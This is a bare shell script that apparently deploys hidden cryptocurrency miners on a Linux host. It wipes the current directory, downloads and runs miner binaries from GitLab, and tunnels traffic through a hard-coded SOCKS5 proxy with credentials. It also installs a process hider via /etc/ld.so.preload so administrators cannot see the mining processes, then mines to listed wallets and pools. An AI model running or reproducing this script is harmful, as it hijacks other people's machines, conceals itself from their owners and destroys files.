rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.83

chmod 777 lol1.83

wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 159.65.179.39:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lol1.83 -a GRAM --pool lolminer.ton.ninja:9999 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --pass x & ./graftcp/graftcp wget https://gitlab.com/ravencoin002/sc/-/raw/main/httpd && chmod 700 httpd && ./httpd -a minotaurx  -o stratum+tcps://152.228.212.204:443 -u P9QXkxt32fYB9ohSyAX4PWd9L6cztCPBXS.niki$(shuf -n 1 -i 1-9999999) -t4
